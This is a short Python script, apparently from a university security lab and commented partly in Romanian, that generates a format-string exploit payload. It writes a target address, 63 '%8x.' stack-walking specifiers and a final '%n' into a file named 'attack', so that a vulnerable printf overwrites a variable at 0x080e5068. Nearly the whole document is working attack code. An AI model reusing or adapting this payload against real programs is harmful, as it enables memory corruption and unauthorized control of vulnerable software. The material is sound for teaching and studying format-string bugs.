#!/usr/bin/python3
import sys

# Initialize the content array
N=64
content = bytearray(0x0 for i in range(N*4+4))
#se pune adresa in codul format
address  = 0x080e5068                                       #adresa variabilei target in care sa se puna 
content[0:4]  =  (address).to_bytes(4,byteorder='little')   # se pune adresa in stringul de input
s = "%8x."* (N-1)                                           #se pun primii 63 de specificatori -> pentru a a junge la variabila pusa pe stiva            
# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt
schimbare = ">%n\n"                                        #se pune %n ca fiind al 64 -lea speficator; acesta va scrie la adresa pusa la linia 9
fmt_afisaj  = (schimbare).encode('latin-1')
content[4+len(fmt): 8 +len(fmt)] = fmt_afisaj              #se ataseaza stringuui de format %n -ul
# Write the content to badfile
with open('attack', 'wb') as f:                            #se scrie in fisier valoarea
  f.write(content)
